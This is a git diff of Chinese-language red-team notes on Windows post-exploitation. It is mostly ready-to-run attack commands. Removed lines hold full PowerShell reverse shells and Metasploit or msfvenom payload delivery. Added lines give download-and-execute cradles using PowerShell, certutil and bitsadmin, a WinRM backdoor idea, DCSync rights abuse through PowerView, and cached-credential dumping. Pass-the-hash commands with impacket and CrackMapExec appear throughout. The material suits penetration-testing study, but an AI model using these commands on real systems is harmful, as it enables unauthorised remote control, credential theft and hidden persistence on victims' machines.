@@ -70,80 +70,64 @@
 **相关文章**
 - [Get Reverse-shell via Windows one-liner](https://www.hackingarticles.in/get-reverse-shell-via-windows-one-liner/)
 - [What Are LOLBins and How Do Attackers Use Them in Fileless Attacks? - Cynet](https://www.cynet.com/attack-techniques-hands-on/what-are-lolbins-and-how-do-attackers-use-them-in-fileless-attacks/)
+- [Windows文件下载执行的15种姿势](https://mp.weixin.qq.com/s/tINvBuhiZwz7MbA_sffapA)
 
 **相关资源**
 - [LOLBAS](https://lolbas-project.github.io/)
 
-## PowerShell
+**powershell**
 
-```powershell
-powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("10.0.0.1",4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+远程下载文件保存在本地
+```
+powershell (new-object System.Net.WebClient).DownloadFile('http://192.168.1.1/1/evil.txt','evil.exe')
 ```
 
-```powershell
-powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.0.0.1',4242);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+远程执行命令
+```
+powershell -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://192.168.1.1/1/evil.txt'))"
 ```
 
-```powershell
-powershell IEX (New-Object Net.WebClient).DownloadString('https://gist.githubusercontent.com/staaldraad/204928a6004e89553a8d3db0ce527fd5/raw/fe5f74ecfae7ec0f2d50895ecf9ab9dafe253ad4/mini-reverse.ps1')
-```
+**smb**
 
-**Powercat.exe**
-
-Powercat 是 PowerShell 的本机后门侦听器和 reverse shel，也称为 netcat 的修改版本，因为它集成了对生成的编码 Payload 的支持，msfvenom 可以做到这一点，并且还具有客户端到客户端的中继(Powercat 客户端的术语，允许连接两个单独的侦听器)。
-
-攻击端
+kali 使用 Impacket
 ```bash
-git clone https://github.com/besimorhino/powercat.git
-cd powercat
-python -m SimpleHTTPServer 80
-
-nc -lvp 1234
-```
-目标端
-```bash
-powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/powercat.ps1');powercat -c 192.168.1.109 -p 1234 -e cmd"
+mkdir smb && cd smb
+impacket-smbserver share `pwd`
 ```
 
-**Batch File**
-
-攻击端
-```bash
-msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=4444 > 1.bat
-
-python -m SimpleHTTPServer 80
-
-nc -lvp 4444
+windows 命令行下拷贝
+```
+copy \\IP\share\file.exe file.exe
 ```
 
-目标端
-```bash
-powershell -c "IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.1.109/1.bat'))
+**Bitsadmin**
+
+bitsadmin 是一个命令行工具，可用于创建下载或上传工作和监测其进展情况。
+```
+bitsadmin /transfer n http://192.168.1.1/1/evil.txt d:\test\1.txt
 ```
 
-**Cscript**
+**certutil**
 
-攻击端
-```bash
-msfvenom -p cmd/windows/reverse_powershell lhost=192.168.1.109 lport=1234 -f vbs > 1.vbs
+用于备份证书服务，支持 xp-win10 都支持。由于 certutil 下载文件都会留下缓存，所以一般都建议下载完文件后对缓存进行删除。
 
-python -m SimpleHTTPServer 80
+缓存目录为: `%USERPROFILE%\AppData\LocalLow\Microsoft\CryptnetUrlCache\Content`
+```
+# 下载
+certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt test.php
 
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set lhost 192.168.1.109
-set lport 1234
-exploit
+# 删除缓存
+certutil -urlcache -split -f http://192.168.28.128/imag/evil.txt delete
 ```
 
-目标端
-```bash
-powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.168.1.109/1.vbs',\"$env:temp\test.vbs\");Start-Process %windir%\system32\cscript.exe \"$env:temp\test.vbs\""
+**ipc$**
 ```
+# 建立远程 IPC 连接
+net use \\192.168.28.128\ipc$ /user:administrator "abc123!"
 
----
-
-## 白名单
+# 复制远程文件到本地主机
+copy \\192.168.28.128\c$\2.txt D:\test
+```
 
 **MSBuild**
 - [Use MSBuild To Do More](https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/)
@@ -151,16 +135,6 @@ powershell.exe -c "(New-Object System.NET.WebClient).DownloadFile('http://192.16
 **Mshta.exe**
 
 Mshta.exe 运行 Microsoft HTML 应用程序主机，这是 Windows OS 实用程序，负责运行 HTA（HTML 应用程序）文件。可以用来运行 JavaScript 或 VBScript 的 HTML 文件。
-
-Metasploit 包含“ HTA Web服务器”模块，该模块会生成恶意的 hta 文件。该模块托管一个 HTML 应用程序（HTA），该应用程序在打开时将通过 Powershell 运行有效负载。当用户导航到 HTA 文件时，在 Payload 执行之前 IE 会提示两次。
-
-攻击端
-```bash
-use exploit/windows/misc/hta_server
-set srvhost 192.168.1.109
-set lhost 192.168.1.109
-exploit
-```
 
 目标端
 ```
@@ -171,17 +145,6 @@ mshta.exe http://192.168.1.109:8080/5EEiDSd70ET0k.hta
 
 Rundll32.exe 与 Windows 操作系统相关联，可调用从 DLL（16位或32位）导出的函数并将其存储在适当的内存库中。
 
-Metasploit 还包含“ SMB Delivery”模块，该模块生成恶意的 dll 文件。该模块通过 SMB 服务器提供有效负载，并提供检索和执行生成的有效负载的命令。当前支持 DLL 和 Powershell。
-
-攻击端
-```bash
-use exploit/windows/smb/smb_delivery
-set srvhost 192.168.1.109
-set lhost 192.168.1.109
-exploit
-```
-
-目标端
 ```cmd
 rundll32.exe \\192.168.1.109\vabFG\test.dll,0
 ```
@@ -190,42 +153,10 @@ rundll32.exe \\192.168.1.109\vabFG\test.dll,0
 
 Regsvr32 是一个命令行实用程序，用于注册和注销 OLE 控件，例如 Windows 注册表中的 DLL 和 ActiveX 控件。Windows XP 和更高版本的 Windows 的 ％systemroot％\ System32 文件夹中安装了 Regsvr32.exe。
 
-Regsvr32使用 “squablydoo” 技术绕过应用程序白名单。签名的 Microsoft 二进制文件 Regsvr32 可以请求一个 .sct 文件，然后在其中执行包含的 PowerShell 命令。这两个 Web 请求（即 .sct 文件和 PowerShell 下载/执行）都可以在同一端口上发生。“PSH(Binary)”将向磁盘写入文件，允许下载/执行自定义二进制文件。
+Regsvr32 使用 “squablydoo” 技术绕过应用程序白名单。签名的 Microsoft 二进制文件 Regsvr32 可以请求一个 .sct 文件，然后在其中执行包含的 PowerShell 命令。这两个 Web 请求（即 .sct 文件和 PowerShell 下载 / 执行）都可以在同一端口上发生。“PSH(Binary)” 将向磁盘写入文件，允许下载 / 执行自定义二进制文件。
 
-攻击端
-```bash
-use exploit/multi/script/web_delivery
-set target 3
-set payload windows/meterpreter/reverse_tcp
-set lhost 192.168.1.109
-set srvhost 192.168.1.109
-exploit
-```
-
-目标端
 ```bash
 regsvr32 /s /n /u /i:http://192.168.1.109:8080/xo31Jt5dIF.sct scrobj.dll
-```
-
-**Certutil.exe**
-
-Certutil.exe 是作为证书服务的一部分安装的命令行程序。我们可以使用此工具在目标计算机上执行恶意 exe 文件，以获取 meterpreter 程序会话。
-
-攻击端
-```bash
-msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.1.109 lport=1234 -f exe > shell.exe
-python -m SimpleHTTPServer 80
-```
-```bash
-use exploit/multi/handler
-set payload windows/meterpreter/reverse_tcp
-set lhost 192.168.1.109
-set lport 1234
-exploit
-```
-目标端
-```bash
-certutil.exe -urlcache -split -f http://192.168.1.109/shell.exe shell.exe & shell.exe
 ```
 
 **Msiexec.exe**
@@ -319,10 +250,6 @@ sc \\host create foobar binpath=“c:\windows\temp\foobar.exe”    # 新建服�
 sc \\host start foobar                                          # 启动建立的服务
 sc \\host delete foobar                                         # 完事后删除服务
 ```
-
----
-
-## Other
 
 **perl**
 ```perl
@@ -510,6 +437,7 @@ netstat -ano | findstr "xxx"
 
 **相关工具**
 - [3gstudent/List-RDP-Connections-History](https://github.com/3gstudent/List-RDP-Connections-History) - 使用 powershell 列出已登录用户或所有用户的 RDP 连接历史记录
+- [Heart-Sky/ListRDPConnections](https://github.com/Heart-Sky/ListRDPConnections) - C# 读取本机对外 RDP 连接记录和其他主机对该主机的连接记录
 
 ---
 
@@ -543,7 +471,7 @@ gpupdate /force                                             //更新组策略
 ```
 
 策略举例
-- 拒绝本地登陆：
+- 拒绝本地登录：
 
     说明：此安全设置确定要防止哪些用户在该计算机上登录。如果帐户受制于此策略设置和“允许本地登录”策略设置，则前者会取代后者。
     ```
@@ -555,7 +483,7 @@ gpupdate /force                                             //更新组策略
     ```
     SeDenyRemoteInteractiveLogonRight = Administrator
     ```
-- 允许本地登陆：
+- 允许本地登录：
 
     说明：确定哪些用户可以登录到该计算机。
     ```
@@ -593,6 +521,10 @@ gpupdate /force                                             //更新组策略
 
 关于 windows 认证的基本知识点可见笔记 [认证](../../../Integrated/Windows/笔记/认证.md)
 
+**学习资源**
+- [daikerSec/windows_protocol](https://github.com/daikerSec/windows_protocol)
+- [The NTLM Authentication Protocol and Security Support Provider](http://davenport.sourceforge.net/ntlm.html)
+
 ## 本地
 
 **相关文章**
@@ -606,13 +538,14 @@ gpupdate /force                                             //更新组策略
 - [凭据收集总结](https://my.oschina.net/csxa/blog/4343803)
 - [Bypass LSA Protection&Credential Guard获取密码](https://xz.aliyun.com/t/6943)
 - [Windows下的密码hash——Net-NTLMv1介绍](https://3gstudent.github.io/3gstudent.github.io/Windows%E4%B8%8B%E7%9A%84%E5%AF%86%E7%A0%81hash-Net-NTLMv1%E4%BB%8B%E7%BB%8D/)
+- [Internal Monologue Attack - Retrieving NTLM Hashes without Touching LSASS (Repost)](https://shenaniganslabs.io/2019/01/14/Internal-Monologue.html)
+- [Credential Dumping: Local Security Authority (LSA|LSASS.EXE)](https://www.hackingarticles.in/credential-dumping-local-security-authority-lsalsass-exe/)
 
 **相关工具**
 - Hashcat
     - [Hashcat 爆破NTLM-hash](../../安全工具/Hashcat.md#爆破NTLM-hash)
     - [Hashcat 爆破net-NTLMv2](../../安全工具/Hashcat.md#爆破net-NTLMv2)
 - [AlessandroZ/LaZagne](https://github.com/AlessandroZ/LaZagne) - 凭证抓取神器
-- [Arvanaghi/SessionGopher](https://github.com/Arvanaghi/SessionGopher) - 使用 WMI 提取 WinSCP、PuTTY、SuperPuTTY、FileZilla 和 Microsoft remote Desktop 等远程访问工具保存的会话信息的 ps 脚本
 - [Invoke-WCMDump](https://github.com/peewpw/Invoke-WCMDump) - 从 Credential Manager 中转储 Windows 凭证的 PowerShell 脚本
     ```
     set-executionpolicy remotesigned
@@ -620,8 +553,8 @@ gpupdate /force                                             //更新组策略
     invoke-wcmdump
     ```
 - [SterJo Key Finder](https://www.sterjosoft.com/key-finder.html) - 找出系统中软件的序列号
-- [uknowsec/SharpDecryptPwd](https://github.com/uknowsec/SharpDecryptPwd) - 对密码已保存在 Windwos 系统上的部分程序进行解析,包括：Navicat,TeamViewer,FileZilla,WinSCP,Xmangager 系列产品(Xshell,Xftp)。
-- Impacket
+- [impacket](https://github.com/SecureAuthCorp/impacket)
+- [evilmog/ntlmv1-multi](https://github.com/evilmog/ntlmv1-multi)
 
 ### mimikatz
 
@@ -637,7 +570,7 @@ gpupdate /force                                             //更新组策略
 - [Post Exploitation Using NetNTLM Downgrade Attacks](https://www.optiv.com/explore-optiv-insights/blog/post-exploitation-using-netntlm-downgrade-attacks)
 
 **相关工具**
-- [eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue) - NetNTLM Downgrade Attacks,通过 SSPI 调⽤ NTLM 身份验证，通过协商使⽤预定义 challenge 降级为 NetNTLMv1，获取到 NetNTLMv1 hash。⽽ NetNTLMv1 hash 可以短时间内使⽤彩虹表去破解。这种情况可以在不接触 LSASS 的情况下检索 NTLM 哈希。可以说比运行 Mimikatz 更隐秘，因为不需要向受保护的进程注入代码或从受保护的进程中转储内存。由于 NetNTLMv1 响应是通过在本地与 NTLMSSP 进行交互而引发的，因此不会生成网络流量，并且所选择的挑战也不容易看到。没有成功的 NTLM 身份验证事件记录在日志中。
+- [eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue) - NetNTLM Downgrade Attacks, 通过 SSPI 调⽤ NTLM 身份验证，通过协商使⽤预定义 challenge 降级为 NetNTLMv1，获取到 NetNTLMv1 hash。⽽ NetNTLMv1 hash 可以短时间内使⽤彩虹表去破解。这种情况可以在不接触 LSASS 的情况下检索 NTLM 哈希。可以说比运行 Mimikatz 更隐秘，因为不需要向受保护的进程注入代码或从受保护的进程中转储内存。由于 NetNTLMv1 响应是通过在本地与 NTLMSSP 进行交互而引发的，因此不会生成网络流量，并且所选择的挑战也不容易看到。没有成功的 NTLM 身份验证事件记录在日志中。
     ```
     InternalMonologue -Downgrade False -Restore False -Impersonate True -Verbose False -Challenge 1122334455667788
     ```
@@ -801,6 +734,21 @@ csript.exe wmiexec.vbs /shell 192.168.1.1 administrator 123456
 
 ---
 
+### WinRM
+
+关于 WinRM 的基本知识点可见笔记 [WinRM](../../../Integrated/Windows/笔记/WinRM.md)
+
+cmd 下,本地也配置允许任意机器连接,然后访问远程主机 winrm
+```
+Winrm quickconfig
+winrm set winrm/config/client @{TrustedHosts="*"}
+winrs -r:http://192.168.1.1:5985 -u:administrator -p:Abcd12345 ipconfig
+```
+
+在 IIS 监听 80 端口的情况下，可以通过设置 WinRM 监听端口为 80，再设置监听 URI 的方式来复用 80 端口。以此作为隐蔽的后门。
+
+---
+
 ### PTH
 
 path-the-hash,中文直译过来就是 hash 传递，在域中是一种比较常用的攻击方式。
@@ -812,6 +760,8 @@ path-the-hash,中文直译过来就是 hash 传递，在域中是一种比较常
 - [Passing-the-Hash to NTLM Authenticated Web Applications](https://labs.f-secure.com/blog/pth-attacks-against-ntlm-authenticated-web-applications/) - PTH 在 Web 应用中的应用
 - [浅学Windows认证](https://b404.xyz/2019/07/23/Study-Windows-Authentication/)
 - [KB22871997是否真的能防御PTH攻击？](https://www.anquanke.com/post/id/193150)
+- [Pass-the-Hash Is Dead: Long Live LocalAccountTokenFilterPolicy](https://www.harmj0y.net/blog/redteaming/pass-the-hash-is-dead-long-live-localaccounttokenfilterpolicy/)
+- [【技术分享】从hash传递攻击谈相关Windows安全机制](https://www.anquanke.com/post/id/85995)
 
 **攻击适用情况**
 - 在工作组环境中：
@@ -831,7 +781,7 @@ path-the-hash,中文直译过来就是 hash 传递，在域中是一种比较常
 通常来说，pass-the-hash 的攻击模式是这样的：
 1. 获取一台域主机高权限
 2. 利用 mimikatz 等工具导出密码 hash
-3. 用导出的 hash 尝试登陆其他域主机
+3. 用导出的 hash 尝试登录其他域主机
 
 要完成一个 NTLM 认证，第一步需要客户端将自己要参与认证的用户名发送至服务器端，等待服务器端给出的 Challenge⋯⋯,其实哈希传递就是使用用户名对应的 NTLM Hash 将服务器给出的 Chanllenge 加密，生成一个 Response，来完成认证。
 
@@ -841,11 +791,11 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
 
 目前常用的 hash 传递工具都是通过 445 端口进行攻击的，也是因为 smb 使用了 ntml 认证，所以导致可以 hash 传递。
 
-- **mimikatz**
+- mimikatz
 
     mimikatz 的 PTH 相关操作见 [mimikatz 笔记](../../安全工具/Mimikatz.md#pth)
 
-- **wmiexec**
+- wmiexec
     - [Invoke-WMIExec](https://github.com/Kevin-Robertson/Invoke-TheHash)
         ```
         Invoke-Module Invoke-TheHash.psd1
@@ -858,12 +808,12 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
         wmiexec -hashes 00000000000000000000000000000000:ccef208c6485269c20db2cad21734fe7 workgroup/administrator@192.168.1.1 "whoami"
         ```
 
-- **WMIC**
+- WMIC
     ```cmd
     wmic /node:host /user:administrator /p 密码 process call create “c:\windows\temp\foobar.exe”
     ```
 
-- **PStools**
+- PStools
     ```cmd
     psexec.exe \\ip -accepteula -u username -p password program.exe
     ```
@@ -872,41 +822,35 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
     psexec \\ip -u user -p passwd cmd /c dir D:\
     ```
 
-- **smbexec**
-    ```
-    copy execserver.exe \\host\c$\windows\
-    test.exe ip user password command netshare
-    ```
-
-- **[impacket](https://github.com/SecureAuthCorp/impacket)**
+- [impacket](https://github.com/SecureAuthCorp/impacket)
     ```bash
     git clone https://github.com/CoreSecurity/impacket.git
     cd impacket/
     python setup.py install
     cd impacket/examples
     ```
-    - **Psexec.py**
+    - Psexec.py
 
         Psexec.py 允许你在远程 Windows 系统上执行进程，复制文件，并返回处理输出结果。此外，它还允许你直接使用完整的交互式控制台执行远程 shell 命令（不需要安装任何客户端软件）。
         ```
         ./psexec.py test/Administrator:Abcd1234@192.168.1.100
         ```
 
-    - **Wmiexec.py**
+    - Wmiexec.py
 
         它会生成一个使用 Windows Management Instrumentation 的半交互式 shell，并以管理员身份运行。你不需要在目标服务器
         ```
         ./wmiexec.py test/Administrator:Abcd1234@192.168.1.100
         ```
 
-    - **Atexec.py**
+    - Atexec.py
 
         通过 Task Scheduler 服务在目标系统上执行命令，并返回输出结果。
         ```
         ./atexec.py test/Administrator:Abcd1234@192.168.1.100 whoami
         ```
 
-- **metasploit**
+- metasploit
 
     目标主机的 Vista 之后的机器，所以只能使用 administrator 用户进行攻击。
     ```bash
@@ -922,7 +866,7 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
     exploit
     ```
 
-- **pth-winexe**
+- pth-winexe
 
     kali 自带的 PTH 套件每个工具都针对 WIN 下相应的 EXE 文件,如使用 Pth-winexe 可以借助哈希执行程序得到一个 cmdshell:
     ```bash
@@ -931,12 +875,13 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
     # no password 就需要替换成空的 LM hash 加密值: aad3b435b51404eeaad3b435b51404ee
     ```
 
-- **[CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)**
+- [byt3bl33d3r/CrackMapExec](https://github.com/byt3bl33d3r/CrackMapExec)
     ```bash
     cme smb x.x.x.x -u administrator -H xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx -x whoami
     ```
 
-- **[SharpMapExec](https://github.com/cube0x0/SharpMapExec)** - c#版本的cme
+- [cube0x0/SharpMapExec](https://github.com/cube0x0/SharpMapExec) - c#版本的cme
+- [ShawnDEvans/smbmap](https://github.com/ShawnDEvans/smbmap)
 
 #### kb2871997
 
@@ -944,17 +889,17 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
 
 在 type3 计算 response 的时候，客户端是使用用户的 hash 进行计算的，而不是用户密码进行计算的。因此在模拟用户登录的时候。是不需要用户明文密码的，只需要用户 hash。
 
-微软在2014年5月13日发布了针对 Pass The Hash 的更新补丁 kb2871997，能够缓解 PTH,具体更改为以下几点。
-- 支持“Protected Users”组；
+微软在 2014 年 5 月 13 日发布了针对 Pass The Hash 的更新补丁 kb2871997，能够缓解 PTH, 具体更改为以下几点。
+- 支持 “Protected Users” 组；
     - “Protected Users”组是 Windows Server 2012 R2 域中的安全组，“Protected Users”组的成员会被强制使用 Kerberos 身份验证，并且对 Kerberos 强制执行 AES 加密。
 - Restricted Admin RDP 模式的远程桌面客户端支持；
     - Restricted Admin RDP 模式是为了避免将 Client 端的凭据暴露给远程系统，同时也产生一种变种的 Pass The Hash（Passing the Hash with Remote Desktop）
 - 注销后删除 LSASS 中的凭据；
-    - 在这个更新之前，只要用户登录系统，Windows 就会在 lsass 中缓存用户的凭据，包括用户的明文密码、LM/NTLM HASH、Kerberos 的 TGT 票据/Session Key。
+    - 在这个更新之前，只要用户登录系统，Windows 就会在 lsass 中缓存用户的凭据，包括用户的明文密码、LM/NTLM HASH、Kerberos 的 TGT 票据 / Session Key。
 - 添加两个新的 SID；
     - 本地帐户，LOCAL_ACCOUNT（S-1-5-113），所有本地帐户继承自此 SID；
     - 本地帐户和管理组成员，LOCAL_ACCOUNT_AND_MEMBER_OF_ADMINISTRATORS_GROUP（S-1-5-114），所有管理员组的本地用户继承此 SID。
-    - 注意：S-1-5-114 这里在中文操作系统中提供的翻译是“NT AUTHORITY\本地帐户和管理员组成员”，但实际上是“所有本地 Administrators 组中的本地帐户”，即域用户即使被加入到了本地 Administrators 组也不继承此 SID。
+    - 注意：S-1-5-114 这里在中文操作系统中提供的翻译是“NT AUTHORITY \ 本地帐户和管理员组成员”，但实际上是“所有本地 Administrators 组中的本地帐户”，即域用户即使被加入到了本地 Administrators 组也不继承此 SID。
 - LSASS 中只允许 wdigest 存储明文密码。
 
 但 kb2871997 对于本地 Administrator(rid 为 500，操作系统只认 rid 不认用户名，接下来我们统称 RID 500 帐户)和本地管理员组的域用户是没有影响的。
@@ -965,7 +910,7 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
 
 根据微软官方关于远程访问和用户帐户控制的相关文档可以了解到，UAC 为了更好的保护 Administrators 组的帐户，会在网络上进行限制。
 
-对于本地“管理员”组中的域用户帐户，文档指出：当具有域用户帐户的用户远程登录 Windows Vista 计算机并且该用户是 Administrators 组的成员时，域用户将在远程计算机上以完全管理员访问令牌运行，并且该用户的 UAC 被禁用在该会话的远程计算机上。
+对于本地 “管理员” 组中的域用户帐户，文档指出：当具有域用户帐户的用户远程登录 Windows Vista 计算机并且该用户是 Administrators 组的成员时，域用户将在远程计算机上以完全管理员访问令牌运行，并且该用户的 UAC 被禁用在该会话的远程计算机上。
 
 对于远程连接到 Windows Vista+ 计算机的任何非 RID 500 本地管理员帐户，无论是通过 WMI，PSEXEC 还是其他方法(有个例外，那就是通过 RDP 远程)，即使用户是本地管理员，返回的令牌都是已过滤的管理员令牌，但是在域用户被加入到本地管理员组之后，域用户可以使用完全管理员（full administrator）的 Access Token 运行，并且 UAC 不会生效。
 
@@ -973,13 +918,13 @@ Pass The Hash 能够完成一个不需要输入密码的 NTLM 协议认证流程
 
 - **FilterAdministratorToken**
 
-    那如何限制 administrator 的远程登录呢？那就是直接把 FilterAdministratorToken 开启就可以了。路径 ：`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken` 设置为 1,修改之后策略会立即生效，使用 administrator 的远程连接也被拒绝了
+    那如何限制 administrator 的远程登录呢？那就是直接把 FilterAdministratorToken 开启就可以了。路径 ：`HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken` 设置为 1, 修改之后策略会立即生效，则 RID 500 帐户（即使已重命名）也已注册为 UAC 保护。这意味着使用该帐户的计算机的远程 PTH 将失败，使用 administrator 的远程连接也被拒绝了。
 
 - **LocalAccountTokenFilterPolicy**
 
-    那如何禁用 UAC 的限制？如果注册表 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` 项存在(默认不存在)且配置为 1，将授予来自管理员所有本地成员的远程连接完整的高完整性令牌。这意味着未过滤非 RID 500 帐户连接，并且可以成功传递哈希值！
+    那如何禁用 UAC 的限制？如果注册表 `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` 项存在 (默认不存在) 且配置为 1，将授予来自管理员所有本地成员的远程连接完整的高完整性令牌。这意味着未过滤非 RID 500 帐户连接，并且可以成功传递哈希值！
 
-    默认情况下这个注册表项是不存在的，我们可以用以留作后门，但是有意思的是，在配置 winrm 的时候，也会遇到同样的问题，本地管理员组的非 RID500 账户不能登录，于是有些运维在搜寻了一堆文章后，开启该注册表项是最快捷有效的问题:)。
+    默认情况下这个注册表项是不存在的，我们可以用以留作后门，但是有意思的是，在配置 Windows Remoting 的时候，有大量的 Microsoft 文档，建议将 LocalAccountTokenFilterPolicy 设置为 1，以解决或解决各种问题，于是有些运维在搜寻了一堆文章后，会开启该注册表项。
 
 #### PTH with RDP
 
@@ -1092,9 +1037,54 @@ dsusers.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.6 data --syshi
 
 #### Dcsync
 
-**mimikatz**
+DCSync 是 mimikatz 在 2015 年添加的一个功能，能够用来导出域内所有用户的 hash
 
-mimikatz 的 DCSync 攻击 NTDS.DIT 操作见 [mimikatz 笔记](../../安全工具/Mimikatz.md#ntdsdit)
+**相关文章**
+- [关于windows下的ACL与dcsync](https://my.oschina.net/u/4587690/blog/4696089)
+- [域渗透——DCSync](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-DCSync/)
+- [域渗透——使用MachineAccount实现DCSync](https://3gstudent.github.io/3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-%E4%BD%BF%E7%94%A8MachineAccount%E5%AE%9E%E7%8E%B0DCSync/)
+
+**利用原理**
+
+DCSync 的利用条件：获得以下任一用户的权限：
+- Administrators 组内的用户
+- Domain Admins 组内的用户
+- Enterprise Admins 组内的用户
+- 域控制器的计算机帐户
+
+**特权用户**
+
+向域内的一个普通用户添加如下三条 ACE(Access Control Entries)：
+- DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2)
+- DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2)
+- DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c)
+该用户即可获得利用 DCSync 导出域内所有用户 hash 的权限
+
+配合 https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
+- 给 test 添加 ACE
+    ```
+    Add-DomainObjectAcl -TargetIdentity "DC=ffffffff0x,DC=com" -PrincipalIdentity test -Rights DCSync -Verbose
+    ```
+
+    ![](../../../../assets/img/Security/RedTeam/OS安全/Windows安全/10.png)
+
+- 给 test 删除 ACE
+    ```
+    Remove-DomainObjectAcl -TargetIdentity "DC=ffffffff0x,DC=com" -PrincipalIdentity test -Rights DCSync -Verbose
+    ```
+
+    ![](../../../../assets/img/Security/RedTeam/OS安全/Windows安全/11.png)
+
+**利用方法**
+- mimikatz
+
+    - [mimikatz 笔记](../../安全工具/Mimikatz.md#DCSync)
+
+- powershell
+    - https://gist.github.com/monoxgas/9d238accd969550136db
+
+**检测方法**
+- [cyberark/ACLight](https://github.com/cyberark/ACLight) - 枚举 Active Directory 中所有用户的 ACL，标记出特权帐户
 
 #### 卷影复制
 
@@ -1198,11 +1188,17 @@ copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYS
 
 ### mscash
 
-Mscash 是微软的一种散列算法，用于在登录成功后将缓存的域凭证存储在系统本地。缓存的凭证不会过期。域凭证被缓存在本地系统上，这样即使DC宕机，域成员也可以登录机器。值得注意的是，mscash hash 是不可 PTH 的
+**相关文章**
+- [你并不懂 Mimikatz Part 2 - MSCACHE](https://mp.weixin.qq.com/s/mTpYcHebvlERj9ek2_Pu8Q)
 
+**利用手段**
 - mimikatz
     ```bash
     lsadump::cache  # 获取 SysKey 用于解密 NLKM 和 MSCache(v2)
+    ```
+- [QAX-A-Team/mscache](https://github.com/QAX-A-Team/mscache)
+    ```
+    python mscache.py --security security --system system
     ```
 
 ---
@@ -1213,7 +1209,7 @@ Mscash 是微软的一种散列算法，用于在登录成功后将缓存的域�
 
 在 GPP 出现之前，很多统一管理的操作只能通过脚本来实现，而 GPP 方便和简化了这样的管理,GPP 你可以将其理解为一个功能点,作用是简单化、规范化组策略的发布和使用。
 
-注 : GPP漏洞只在2008没打补丁版本上存在，超过2008版本的系统是没办法写入密码的。
+注 : GPP 漏洞只在 2008 没打补丁版本上存在，超过 2008 版本的系统是没办法写入密码的。
 
 域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹 \SYSVOL 下，默认所有域内用户可访问，虽然被加密，但很容易被解密,访问 XML 文件，利用 AES 私钥可以解密 GPP 密码。
 
@@ -1639,5 +1635,5 @@ kekeo.exe "tgt::ask /user:sqlsvr /domain:ffffffff0x.com /password:Admin12345" ex
 
 kekeo.exe "tgs::s4u /tgt:TGT_sqlsvr@ffffffff0x.com_krbtgt~ffffffff0x.com@ffffffff0x.com.kirbi /user:administrator@ffffffff0x.com /service:/service:service_to_access" exit
 
-Tgs::s4u /tgt:service_account_tgt_file /user:administrator@testlab.com /service:service_to_access
+Tgs::s4u /tgt:service_account_tgt_file /user:administrator@ffffffff0x.com /service:service_to_access
 ```
